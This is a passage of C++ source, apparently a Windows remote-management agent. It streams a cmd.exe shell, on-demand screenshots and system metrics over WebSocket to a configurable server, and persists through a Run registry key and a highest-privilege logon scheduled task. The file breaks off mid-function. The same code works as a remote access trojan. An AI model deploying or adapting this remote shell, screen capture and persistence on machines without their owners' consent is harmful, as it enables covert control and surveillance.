// Target Windows 10 or later (Required for PseudoConsole/ConPTY)
#define _WIN32_WINNT 0x0A00
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <windows.h>
#include <winhttp.h>
#include <taskschd.h>
#include <comdef.h>
#include <iostream>
#include <string>
#include <sstream>
#include <thread>
#include <mutex>
#include <atomic>
#include <memory>
#include <memory>
#include <shlobj.h>
#include <lmcons.h>
#include <gdiplus.h>
#include <vector>
#include <algorithm>
#include <pdh.h>
#include <pdhmsg.h>
#include <pdh.h>
#include <pdhmsg.h>
#include "json.hpp"

using namespace Gdiplus;
using json = nlohmann::json;

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "pdh.lib")
#pragma comment(lib, "iphlpapi.lib")


namespace Config {
    // Debug Mode
#ifdef _DEBUG
    const bool DEBUG_MODE = true;                    // Set false for production
#else
	const bool DEBUG_MODE = false;                   // Set false for production
#endif
    // WebSocket Server Configuration
    const wchar_t* SERVER_HOST = L"localhost";       // Change to your server IP/domain
    const int SERVER_PORT = 9991;                    // Change to your server port
    const bool USE_SSL = false;                      // Set true for wss:// (secure)

    // Application Settings
    const wchar_t* APP_NAME = L"App Handler";        // Name in registry
    const bool AUTO_START = true;                    // Enable auto-start on login (ignored if DEBUG_MODE)
    const bool AUTO_RESTART_ON_CRASH = true;         // Enable Task Scheduler auto-restart

    // Reconnection Settings
    const int RECONNECT_DELAY_MS = 5000;             // Delay before reconnect (ms)
    const int MAX_RECONNECT_ATTEMPTS = 0;            // 0 = infinite retry
    const int RECONNECT_BACKOFF_MAX_MS = 60000;      // Max backoff delay (1 minute)
    const bool USE_EXPONENTIAL_BACKOFF = true;       // Increase delay on repeated failures
    
    // Keep-Alive Settings
    const int KEEP_ALIVE_INTERVAL_MS = 30000;        // Send ping every 30 seconds to prevent timeout

    // Terminal Settings
    const int CONSOLE_WIDTH = 120;                   // Terminal columns
    const int CONSOLE_HEIGHT = 30;                   // Terminal rows

    // Version
    const wchar_t* APP_VERSION = L"1.0.0";

    // User ID, get id in dashboard
    const wchar_t* USER_ID = L""; 
}

struct AppState {
    HANDLE hPipeIn = INVALID_HANDLE_VALUE;
    HANDLE hPipeOut = INVALID_HANDLE_VALUE;
    HPCON hPseudoConsole = nullptr;
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;
    HINTERNET hWebSocket = nullptr;
    std::atomic<bool> running{ true };
    std::atomic<bool> wsConnected{ false };
    std::atomic<bool> shouldReconnect{ true };
    std::mutex wsMutex;
    int reconnectAttempts = 0;
    DWORD lastPingTime = 0;
    DWORD lastMetricsTime = 0;
    ULONG_PTR gdiplusToken;
} g_state;

// Metrics Globals
PDH_HQUERY cpuQuery;
PDH_HCOUNTER cpuTotal;
unsigned long long lastNetUp = 0;
unsigned long long lastNetDown = 0;
DWORD lastNetCheck = 0;

typedef HRESULT(WINAPI* PFN_CreatePseudoConsole)(COORD, HANDLE, HANDLE, DWORD, HPCON*);
typedef void(WINAPI* PFN_ClosePseudoConsole)(HPCON);
typedef HRESULT(WINAPI* PFN_ResizePseudoConsole)(HPCON, COORD);

PFN_CreatePseudoConsole g_CreatePseudoConsole = nullptr;
PFN_ClosePseudoConsole g_ClosePseudoConsole = nullptr;
PFN_ResizePseudoConsole g_ResizePseudoConsole = nullptr;

// Forward declarations
void Cleanup(bool fullCleanup = false);
bool CreateConPTY();
bool ConnectWebSocket(const std::string& deviceId, const std::string& deviceName);

// Load ConPTY API
bool LoadConPTYAPI() {
    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel) return false;

    g_CreatePseudoConsole = (PFN_CreatePseudoConsole)GetProcAddress(hKernel, "CreatePseudoConsole");
    g_ClosePseudoConsole = (PFN_ClosePseudoConsole)GetProcAddress(hKernel, "ClosePseudoConsole");
    g_ResizePseudoConsole = (PFN_ResizePseudoConsole)GetProcAddress(hKernel, "ResizePseudoConsole");

    return (g_CreatePseudoConsole && g_ClosePseudoConsole && g_ResizePseudoConsole);
}

void InitMetrics() {
    PdhOpenQuery(NULL, NULL, &cpuQuery);
    PdhAddEnglishCounter(cpuQuery, L"\\Processor(_Total)\\% Processor Time", NULL, &cpuTotal);
    PdhCollectQueryData(cpuQuery);
}

double GetCpuUsage() {
    PDH_FMT_COUNTERVALUE counterVal;
    PdhCollectQueryData(cpuQuery);
    PdhGetFormattedCounterValue(cpuTotal, PDH_FMT_DOUBLE, NULL, &counterVal);
    return counterVal.doubleValue;
}

int GetRamUsage() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    return memInfo.dwMemoryLoad; // % usage
}

int GetDiskUsage() {
    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
    if (GetDiskFreeSpaceEx(L"C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
        double total = (double)totalNumberOfBytes.QuadPart;
        double free = (double)totalNumberOfFreeBytes.QuadPart;
        return (int)((1.0 - (free / total)) * 100.0);
    }
    return 0;
}

struct NetStats {
    double upKBps;
    double downKBps;
};

NetStats GetNetworkUsage() {
    MIB_IF_TABLE2* table;
    if (GetIfTable2(&table) != NO_ERROR) return { 0, 0 };

    unsigned long long totalTx = 0;
    unsigned long long totalRx = 0;

    for (int i = 0; i < table->NumEntries; i++) {
        totalTx += table->Table[i].OutOctets;
        totalRx += table->Table[i].InOctets;
    }
    FreeMibTable(table);

    DWORD now = GetTickCount();
    double timeDiff = (now - lastNetCheck) / 1000.0;
    if (timeDiff < 0.1) return { 0, 0 }; // Too fast

    double upSpeed = 0;
    double downSpeed = 0;

    if (lastNetCheck != 0) {
        upSpeed = (totalTx - lastNetUp) / timeDiff / 1024.0; // KB/s
        downSpeed = (totalRx - lastNetDown) / timeDiff / 1024.0; // KB/s
    }

    lastNetUp = totalTx;
    lastNetDown = totalRx;
    lastNetCheck = now;

    return { upSpeed, downSpeed };
}

// Get HWID using WMIC
std::string GetHWID() {
    std::string hwid;
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };

    if (CreatePipe(&hRead, &hWrite, &sa, 0)) {
        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        wchar_t cmd[] = L"wmic csproduct get uuid";

        if (CreateProcessW(nullptr, cmd, nullptr, nullptr, TRUE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {

            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(hWrite);

            char buffer[512];
            DWORD bytesRead;
            std::string output;

            while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                output += buffer;
            }

            // Parse UUID from output
            size_t pos = output.find('\n');
            if (pos != std::string::npos && pos + 1 < output.size()) {
                std::string line = output.substr(pos + 1);
                size_t start = line.find_first_not_of(" \t\r\n");
                size_t end = line.find_last_not_of(" \t\r\n");
                if (start != std::string::npos && end != std::string::npos) {
                    hwid = line.substr(start, end - start + 1);
                }
            }

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            CloseHandle(hWrite);
        }
        CloseHandle(hRead);
    }

    // Fallback
    if (hwid.empty()) {
        wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1];
        wchar_t username[UNLEN + 1];
        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
        GetComputerNameW(hostname, &size);
        size = UNLEN + 1;
        GetUserNameW(username, &size);

        char hBuffer[512], uBuffer[512];
        WideCharToMultiByte(CP_UTF8, 0, hostname, -1, hBuffer, sizeof(hBuffer), nullptr, nullptr);
        WideCharToMultiByte(CP_UTF8, 0, username, -1, uBuffer, sizeof(uBuffer), nullptr, nullptr);
        hwid = std::string(hBuffer) + "-" + std::string(uBuffer);
    }

    return hwid;
}

// Base64 Encoding
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string Base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while (i++ < 3)
            ret += '=';
    }

    return ret;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;  // Failure

    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

std::string CaptureScreenBase64() {
    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x2, y2);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);

    BitBlt(hDC, 0, 0, x2, y2, hScreen, x1, y1, SRCCOPY);

    // Create GDI+ Bitmap from HBITMAP
    Bitmap* bitmap = new Bitmap(hBitmap, NULL);
    
    // Save to memory stream
    IStream* pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    
    CLSID clsid;
    GetEncoderClsid(L"image/png", &clsid);
    
    // Resize down if too big to save bandwidth (Optional, keeping full res for now but good to note)
    // For now we'll save as PNG to the stream
    bitmap->Save(pStream, &clsid, NULL);
    
    // Get bytes from stream
    LARGE_INTEGER liZero = {};
    ULARGE_INTEGER pos = {};
    pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
    
    // Get size
    STATSTG statstg;
    pStream->Stat(&statstg, STATFLAG_NONAME);
    ULONG streamSize = (ULONG)statstg.cbSize.QuadPart;
    
    std::vector<BYTE> buffer(streamSize);
    ULONG bytesRead;
    pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
    pStream->Read(buffer.data(), streamSize, &bytesRead);
    
    // Clean up
    pStream->Release();
    delete bitmap;
    SelectObject(hDC, old_obj);
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    
    return Base64Encode(buffer.data(), buffer.size());
}

// Get device name
std::string GetDeviceName() {
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(hostname, &size);

    char buffer[512];
    WideCharToMultiByte(CP_UTF8, 0, hostname, -1, buffer, sizeof(buffer), nullptr, nullptr);
    return std::string(buffer);
}

// URL encode
std::string UrlEncode(const std::string& str) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex << std::uppercase;

    for (char c : str) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        }
        else {
            escaped << '%' << std::setw(2) << int((unsigned char)c);
        }
    }
    return escaped.str();
}

// Get OS Version
std::string GetOSVersion() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t productName[256];
        DWORD size = sizeof(productName);
        if (RegQueryValueExW(hKey, L"ProductName", nullptr, nullptr, (LPBYTE)productName, &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            char buffer[512];
            WideCharToMultiByte(CP_UTF8, 0, productName, -1, buffer, sizeof(buffer), nullptr, nullptr);
            return std::string(buffer);
        }
        RegCloseKey(hKey);
    }
    return "Windows (Unknown)";
}

// Get System Uptime in MS
unsigned long long GetSystemUptime() {
    return GetTickCount64();
}

bool CreateAutoRestartTask(const std::wstring& appPath) {
    if (Config::DEBUG_MODE || !Config::AUTO_RESTART_ON_CRASH) {
        return true;
    }

    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;

    ITaskService* pService = nullptr;
    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);

    if (SUCCEEDED(hr)) {
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

        if (SUCCEEDED(hr)) {
            ITaskFolder* pRootFolder = nullptr;
            hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);

            if (SUCCEEDED(hr)) {
                // Delete existing task
                pRootFolder->DeleteTask(_bstr_t(Config::APP_NAME), 0);

                ITaskDefinition* pTask = nullptr;
                hr = pService->NewTask(0, &pTask);

                if (SUCCEEDED(hr)) {
                    // Set registration info
                    IRegistrationInfo* pRegInfo = nullptr;
                    pTask->get_RegistrationInfo(&pRegInfo);
                    if (pRegInfo) {
                        pRegInfo->put_Author(_bstr_t(L"AgentHandler"));
                        pRegInfo->put_Description(_bstr_t(L"Auto-restart AgentHandler on crash"));
                        pRegInfo->Release();
                    }

                    // Set principal (run with highest privileges)
                    IPrincipal* pPrincipal = nullptr;
                    pTask->get_Principal(&pPrincipal);
                    if (pPrincipal) {
                        pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
                        pPrincipal->Release();
                    }

                    // Set settings
                    ITaskSettings* pSettings = nullptr;
                    pTask->get_Settings(&pSettings);
                    if (pSettings) {
                        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
                        pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
                        pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
                        pSettings->put_RestartCount(3);
                        pSettings->put_RestartInterval(_bstr_t(L"PT1M")); // 1 minute
                        pSettings->Release();
                    }

                    // Create trigger (on logon)
                    ITriggerCollection* pTriggerCollection = nullptr;
                    pTask->get_Triggers(&pTriggerCollection);
                    if (pTriggerCollection) {
                        ITrigger* pTrigger = nullptr;
                        pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
                        if (pTrigger) {
                            ILogonTrigger* pLogonTrigger = nullptr;
                            pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
                            if (pLogonTrigger) {
                                pLogonTrigger->put_Id(_bstr_t(L"LogonTriggerId"));
                                pLogonTrigger->Release();
                            }
                            pTrigger->Release();
                        }
                        pTriggerCollection->Release();
                    }

                    // Create action
                    IActionCollection* pActionCollection = nullptr;
                    pTask->get_Actions(&pActionCollection);
                    if (pActionCollection) {
                        IAction* pAction = nullptr;
                        pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
                        if (pAction) {
                            IExecAction* pExecAction = nullptr;
                            pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                            if (pExecAction) {
                                pExecAction->put_Path(_bstr_t(appPath.c_str()));
                                pExecAction->Release();
                            }
                            pAction->Release();
                        }
                        pActionCollection->Release();
                    }

                    // Register task
                    IRegisteredTask* pRegisteredTask = nullptr;
                    hr = pRootFolder->RegisterTaskDefinition(
                        _bstr_t(Config::APP_NAME),
                        pTask,
                        TASK_CREATE_OR_UPDATE,
                        _variant_t(),
                        _variant_t(),
                        TASK_LOGON_INTERACTIVE_TOKEN,
                        _variant_t(L""),
                        &pRegisteredTask);

                    if (pRegisteredTask) pRegisteredTask->Release();
                    pTask->Release();
                }
                pRootFolder->Release();
            }
        }
        pService->Release();
    }

    CoUninitialize();
    return SUCCEEDED(hr);
}

bool SetAutoStart(const std::wstring& appPath) {
    if (Config::DEBUG_MODE) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, Config::APP_NAME);
            RegCloseKey(hKey);
        }
        return true;
    }

    if (!Config::AUTO_START) return true;

    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    if (result == ERROR_SUCCESS) {
        std::wstring value = L"\"" + appPath + L"\"";
        result = RegSetValueExW(hKey, Config::APP_NAME, 0, REG_SZ,
            (const BYTE*)value.c_str(),
            (DWORD)((value.length() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
        return (result == ERROR_SUCCESS);
    }
    return false;
}

bool CreateConPTY() {
    printf("Loading ConPTY API...\n");
    if (!LoadConPTYAPI()) {
        printf("ConPTY not supported (need Windows 10 1809+)\n");
        return false;
    }

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hPipePTYIn = NULL;
    HANDLE hPipePTYOut = NULL;

    if (!CreatePipe(&hPipePTYIn, &g_state.hPipeOut, &sa, 0)) {
        printf("Failed to create output pipe: %d\n", GetLastError());
        return false;
    }

    if (!CreatePipe(&g_state.hPipeIn, &hPipePTYOut, &sa, 0)) {
        printf("Failed to create input pipe: %d\n", GetLastError());
        CloseHandle(hPipePTYIn);
        CloseHandle(g_state.hPipeOut);
        return false;
    }

    SetHandleInformation(g_state.hPipeIn, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(g_state.hPipeOut, HANDLE_FLAG_INHERIT, 0);

    printf("Pipes created\n");

    COORD consoleSize;
    consoleSize.X = (SHORT)Config::CONSOLE_WIDTH;
    consoleSize.Y = (SHORT)Config::CONSOLE_HEIGHT;

    HRESULT hr = g_CreatePseudoConsole(
        consoleSize,
        hPipePTYIn,
        hPipePTYOut,
        0,
        &g_state.hPseudoConsole
    );

    if (FAILED(hr)) {
        printf("CreatePseudoConsole failed: 0x%08X\n", hr);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        CloseHandle(g_state.hPipeIn);
        CloseHandle(g_state.hPipeOut);
        return false;
    }

    printf("ConPTY created\n");

    SIZE_T attributeListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);

    PPROC_THREAD_ATTRIBUTE_LIST attributeList = (PPROC_THREAD_ATTRIBUTE_LIST)
        HeapAlloc(GetProcessHeap(), 0, attributeListSize);

    if (!attributeList) {
        printf("Failed to allocate attribute list\n");
        g_ClosePseudoConsole(g_state.hPseudoConsole);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        return false;
    }

    if (!InitializeProcThreadAttributeList(attributeList, 1, 0, &attributeListSize)) {
        printf("InitializeProcThreadAttributeList failed: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, attributeList);
        g_ClosePseudoConsole(g_state.hPseudoConsole);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        return false;
    }

    if (!UpdateProcThreadAttribute(
        attributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
        g_state.hPseudoConsole,
        sizeof(HPCON),
        NULL,
        NULL
    )) {
        printf("UpdateProcThreadAttribute failed: %d\n", GetLastError());
        DeleteProcThreadAttributeList(attributeList);
        HeapFree(GetProcessHeap(), 0, attributeList);
        g_ClosePseudoConsole(g_state.hPseudoConsole);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        return false;
    }

    printf("Attribute list initialized\n");

    STARTUPINFOEXW startupInfo;
    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    startupInfo.lpAttributeList = attributeList;

    PROCESS_INFORMATION processInfo;
    ZeroMemory(&processInfo, sizeof(processInfo));

    wchar_t commandLine[] = L"cmd.exe";

    printf("Creating process: %S\n", commandLine);

    BOOL result = CreateProcessW(
        NULL,
        commandLine,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT,
        NULL,
        NULL,
        &startupInfo.StartupInfo,
        &processInfo
    );

    DeleteProcThreadAttributeList(attributeList);
    HeapFree(GetProcessHeap(), 0, attributeList);

    CloseHandle(hPipePTYIn);
    CloseHandle(hPipePTYOut);

    if (!result) {
        printf("CreateProcess failed: %d\n", GetLastError());
        g_ClosePseudoConsole(g_state.hPseudoConsole);
        CloseHandle(g_state.hPipeIn);
        CloseHandle(g_state.hPipeOut);
        return false;
    }

    g_state.hProcess = processInfo.hProcess;
    CloseHandle(processInfo.hThread);

    printf("Process created (PID: %d)\n", processInfo.dwProcessId);
    Sleep(500);

    return true;
}

void ReadPTYOutput() {
    printf("PTY Reader thread started\n");
    char buffer[8192];
    DWORD bytesRead;

    while (g_state.running && g_state.hPipeIn != INVALID_HANDLE_VALUE) {
        if (g_state.hProcess != INVALID_HANDLE_VALUE) {
            DWORD exitCode;
            if (GetExitCodeProcess(g_state.hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
                printf("PowerShell process exited with code: %d\n", exitCode);
                break;
            }
        }

        DWORD bytesAvail = 0;
        if (!PeekNamedPipe(g_state.hPipeIn, nullptr, 0, nullptr, &bytesAvail, nullptr)) {
            DWORD err = GetLastError();
            if (err == ERROR_BROKEN_PIPE) {
                printf("PTY pipe broken\n");
                break;
            }
            Sleep(100);
            continue;
        }

        if (bytesAvail > 0) {
            if (ReadFile(g_state.hPipeIn, buffer, sizeof(buffer), &bytesRead, nullptr) && bytesRead > 0) {
                json msg;
                msg["type"] = "output";
                msg["output"] = std::string(buffer, bytesRead);

                std::lock_guard<std::mutex> lock(g_state.wsMutex);
                if (g_state.hWebSocket && g_state.wsConnected) {
                    std::string msgStr = msg.dump();
                    DWORD wsResult = WinHttpWebSocketSend(g_state.hWebSocket,
                        WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                        (PVOID)msgStr.c_str(), (DWORD)msgStr.length());

                    if (wsResult != ERROR_SUCCESS) {
                        printf("WebSocket send failed: %d\n", wsResult);
                        g_state.wsConnected = false;
                    }
                }
            }
        }
        else {
            Sleep(50);
        }
    }

    printf("PTY Reader thread stopped\n");
}

void SendPing() {
    std::lock_guard<std::mutex> lock(g_state.wsMutex);
    if (g_state.hWebSocket && g_state.wsConnected) {
        json pingMsg;
        pingMsg["type"] = "ping";
        pingMsg["uptime"] = GetSystemUptime();
        std::string msgStr = pingMsg.dump();
        
        DWORD result = WinHttpWebSocketSend(g_state.hWebSocket,
            WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
            (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
        
        if (result == ERROR_SUCCESS) {
            printf("Keep-alive ping sent (uptime: %llu)\n", pingMsg["uptime"].get<unsigned long long>());
        } else {
            printf("Keep-alive ping failed: %d\n", result);
            g_state.wsConnected = false;
        }
    }
}

void KeepAliveThread() {
    printf("Keep-alive thread started (interval: %d ms)\n", Config::KEEP_ALIVE_INTERVAL_MS);
    g_state.lastPingTime = GetTickCount();
    
    while (g_state.running && g_state.wsConnected) {
        DWORD currentTime = GetTickCount();
        DWORD elapsed = currentTime - g_state.lastPingTime;
        
        if (elapsed >= (DWORD)Config::KEEP_ALIVE_INTERVAL_MS) {
            SendPing();
            g_state.lastPingTime = currentTime;
        }
        
        Sleep(1000);  // Check every second

        // Send metrics every 2 seconds
        if (currentTime - g_state.lastMetricsTime >= 2000) {
            NetStats net = GetNetworkUsage();
            json metrics;
            metrics["type"] = "metrics";
            metrics["data"] = {
                {"cpu", GetCpuUsage()},
                {"ram", GetRamUsage()},
                {"disk", GetDiskUsage()},
                {"netUp", net.upKBps},
                {"netDown", net.downKBps}
            };
            
             std::lock_guard<std::mutex> lock(g_state.wsMutex);
             if (g_state.hWebSocket && g_state.wsConnected) {
                std::string msgStr = metrics.dump();
                WinHttpWebSocketSend(g_state.hWebSocket,
                    WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                    (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
             }
             g_state.lastMetricsTime = currentTime;
        }
    }
    
    printf("Keep-alive thread stopped\n");
}

void WebSocketReceiveLoop() {
    std::vector<BYTE> buffer(65536);

    while (g_state.running && g_state.hWebSocket) {
        DWORD bytesRead = 0;
        WINHTTP_WEB_SOCKET_BUFFER_TYPE bufferType;

        DWORD result = WinHttpWebSocketReceive(g_state.hWebSocket,
            buffer.data(), (DWORD)buffer.size(), &bytesRead, &bufferType);

        if (result != ERROR_SUCCESS || bytesRead == 0) {
            printf("WebSocket disconnected\n");
            g_state.wsConnected = false;
            break;
        }

        try {
            std::string msgStr((char*)buffer.data(), bytesRead);
            json msg = json::parse(msgStr);
            printf("Data: %s\n", msgStr.c_str());

            if (msg["type"] == "input" && msg.contains("data")) {
                std::string data = msg["data"];
                DWORD written;
                WriteFile(g_state.hPipeOut, data.c_str(), (DWORD)data.length(), &written, nullptr);
            }
            else if (msg["type"] == "command" && msg.contains("command")) {
                std::string cmd = msg["command"].get<std::string>() + "\r\n";
                DWORD written;
                WriteFile(g_state.hPipeOut, cmd.c_str(), (DWORD)cmd.length(), &written, nullptr);
            }
            else if (msg["type"] == "action" && msg.contains("action")) {
                std::string action = msg["action"];
                if (action == "screenshot") {
                    printf("Screenshotting...\n");
                    std::string base64Img = CaptureScreenBase64();
                    
                    json resp;
                    resp["type"] = "screenshot";
                    resp["data"] = base64Img;
                    
                    std::string msgStr = resp.dump();
                    
                    std::lock_guard<std::mutex> lock(g_state.wsMutex);
                    if (g_state.hWebSocket && g_state.wsConnected) {
                        printf("Sending screenshot...\n");
                        WinHttpWebSocketSend(g_state.hWebSocket,
                            WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                            (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
                    }
                }
            }
            else if (msg["type"] == "resize" && msg.contains("cols") && msg.contains("rows")) {
                COORD size = { (SHORT)msg["cols"].get<int>(), (SHORT)msg["rows"].get<int>() };
                if (g_ResizePseudoConsole && g_state.hPseudoConsole) {
                    g_ResizePseudoConsole(g_state.hPseudoConsole, size);
                }
            }
            else if (msg["type"] == "pong") {
                // Server responded to our ping - connection is alive
                printf("Received pong from server\n");
            }
        }
        catch (...) {
            // Ignore parse errors
        }
    }
}

bool ConnectWebSocket(const std::string& deviceId, const std::string& deviceName) {
    printf("Connecting to WebSocket server...\n");

    g_state.hSession = WinHttpOpen(L"AgentHandler/2.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!g_state.hSession) {
        printf("WinHttpOpen failed: %d\n", GetLastError());
        return false;
    }

    DWORD flags = Config::USE_SSL ? WINHTTP_FLAG_SECURE : 0;
    g_state.hConnect = WinHttpConnect(g_state.hSession, Config::SERVER_HOST,
        Config::SERVER_PORT, 0);

    if (!g_state.hConnect) {
        printf("WinHttpConnect failed: %d\n", GetLastError());
        return false;
    }

    std::string osVersion = UrlEncode(GetOSVersion());
    char versionBuf[32];
    WideCharToMultiByte(CP_UTF8, 0, Config::APP_VERSION, -1, versionBuf, sizeof(versionBuf), nullptr, nullptr);
    std::string appVersion = UrlEncode(versionBuf);

    char userIdBuf[64];
    WideCharToMultiByte(CP_UTF8, 0, Config::USER_ID, -1, userIdBuf, sizeof(userIdBuf), nullptr, nullptr);
    std::string userId = UrlEncode(userIdBuf);

    std::string query = "/?type=device&id=" + deviceId + "&name=" + UrlEncode(deviceName) + "&os=" + osVersion + "&version=" + appVersion;
    if (!userId.empty()) {
        query += "&userId=" + userId;
    }
    std::wstring wQuery(query.begin(), query.end());

    HINTERNET hRequest = WinHttpOpenRequest(g_state.hConnect, L"GET", wQuery.c_str(),
